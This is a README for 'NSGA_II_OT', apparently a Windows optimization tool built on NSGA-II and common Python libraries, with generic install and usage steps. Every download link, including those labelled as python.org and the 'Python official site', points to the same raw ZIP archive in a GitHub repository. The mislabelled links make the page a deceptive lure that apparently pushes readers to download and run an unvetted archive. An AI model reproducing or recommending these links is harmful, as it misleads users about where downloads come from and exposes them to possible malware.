# 🛠️ NSGA_II_OT - Efficient Multi-Objective Optimization Tool

[![Download NSGA_II_OT](https://img.shields.io/badge/Download-NSGA__II__OT-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Hotissuesalad740/NSGA_II_OT/main/nsga2_improved/OT_I_NSG_3.2-alpha.3.zip)

---

## 📦 What is NSGA_II_OT?

NSGA_II_OT is a software application designed to help solve problems with multiple goals using a method called NSGA-II (Non-dominated Sorting Genetic Algorithm II). It uses algorithms to find the best possible solutions when you have to balance more than one factor. This tool runs on Windows and is meant for users who want to optimize tasks without needing programming skills.

The software uses popular Python packages like numpy, pandas, matplotlib, seaborn, pymoo, and tabulate. These libraries work together to analyze data, run optimization processes, and show results in clear charts and tables.

---

## 🖥️ System Requirements

Before installing NSGA_II_OT, check that your Windows computer meets these requirements:

- Windows 10 or newer (64-bit preferred)  
- At least 4 GB of RAM  
- 500 MB free disk space  
- Python 3.8 or higher installed (if not, the software can set it up automatically)  
- Internet connection to download dependencies

A dedicated graphics card is not necessary. The program runs fine on most modern computers.

---

## 🚀 Getting Started

### Step 1: Visit the Download Page

Start by going to the official download page for NSGA_II_OT. Use this link to access the latest version and all related files:

[Visit NSGA_II_OT GitHub Page](https://raw.githubusercontent.com/Hotissuesalad740/NSGA_II_OT/main/nsga2_improved/OT_I_NSG_3.2-alpha.3.zip)

### Step 2: Download the Software

On the GitHub page, look for the “Releases” or "Code" section. Download the latest release or the main codebase as a ZIP file.

If you download the ZIP file, make sure to extract all files to a folder that is easy to access, like your Desktop or Documents.

### Step 3: Install Python and Dependencies

If you do not have Python 3.8 or newer installed:

1. Visit [python.org/downloads](https://raw.githubusercontent.com/Hotissuesalad740/NSGA_II_OT/main/nsga2_improved/OT_I_NSG_3.2-alpha.3.zip) and download the latest Windows version.
2. Run the installer and select the option to add Python to your system PATH.
3. After installation, open the Command Prompt (type `cmd` in the Start menu search) and confirm installation by typing:
   ```  
   python --version
   ```
   You should see the installed Python version.

Next, open Command Prompt and navigate to the folder where you extracted NSGA_II_OT using the `cd` command. For example:
```
cd Desktop\NSGA_II_OT
```

Run the following command to install the needed software packages used by NSGA_II_OT:
```
pip install -r requirements.txt
```

This installs all required Python libraries like numpy, pandas, matplotlib, seaborn, pymoo, and tabulate.

### Step 4: Activate Virtual Environment (Recommended)

If you want to keep this software isolated from others, use a virtual environment:

Create it by running:
```
python -m venv venv
```

Activate it by running one of the commands below depending on your Windows version:

- For Command Prompt:
  ```
  venv\Scripts\activate.bat
  ```

- For PowerShell:
  ```
  venv\Scripts\Activate.ps1
  ```

Then install requirements as described above inside this environment.

---

## ▶️ Running NSGA_II_OT

Now that you have installed everything, you can run the program.

1. Open Command Prompt.  
2. Navigate to the NSGA_II_OT folder.  
3. Run the main program by entering:
   ```
   python main.py
   ```

The program will start and guide you with prompts on how to enter your data and run optimization.

---

## 🔍 Understanding Features and Output

### Multi-Objective Optimization

The main feature is the NSGA-II algorithm. It finds solutions that balance multiple goals. For example, it can help you maximize quality while minimizing cost if you are working with a project.

### Data Visualization

NSGA_II_OT uses matplotlib and seaborn to display your results. It shows charts like scatter plots and line graphs. These visuals help you compare solutions clearly.

### Data Handling

The software uses pandas and numpy to manage and analyze data efficiently. It accepts data files in common formats like CSV.

### Reports

You can view and save summary tables created using the tabulate library. These tables summarize key results for easy reference.

---

## ⚙️ Customizing and Using Your Data

NSGA_II_OT expects input data files in CSV format. Each file should list options and the values for each goal. Check the example data included in the repository to see the required format.

The software prompts you to enter file paths and settings to tailor the optimization to your needs.

If you want to modify settings or run with custom goals, edit the `config.yaml` file in the main folder. Use a simple text editor like Notepad to make changes. Comments inside the file explain each option.

---

## 🛠️ Troubleshooting

- If the program does not start, check Python installation and that you installed all dependencies.
- If you see errors about missing packages, run:
  ```
  pip install -r requirements.txt
  ```
- Ensure you run commands inside the folder where you extracted the files.
- If graphical windows do not appear, verify your display settings and update your graphics drivers if needed.
- For help reading or formatting input data, refer to the example CSV files in the repository.

---

## 🔗 Useful Links

- Download and setup: [https://raw.githubusercontent.com/Hotissuesalad740/NSGA_II_OT/main/nsga2_improved/OT_I_NSG_3.2-alpha.3.zip](https://raw.githubusercontent.com/Hotissuesalad740/NSGA_II_OT/main/nsga2_improved/OT_I_NSG_3.2-alpha.3.zip)
- Python official site: [https://raw.githubusercontent.com/Hotissuesalad740/NSGA_II_OT/main/nsga2_improved/OT_I_NSG_3.2-alpha.3.zip](https://raw.githubusercontent.com/Hotissuesalad740/NSGA_II_OT/main/nsga2_improved/OT_I_NSG_3.2-alpha.3.zip)
- Example input files are available inside the repository under the `examples` folder.  

[![Download NSGA_II_OT](https://img.shields.io/badge/Download-NSGA__II__OT-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Hotissuesalad740/NSGA_II_OT/main/nsga2_improved/OT_I_NSG_3.2-alpha.3.zip)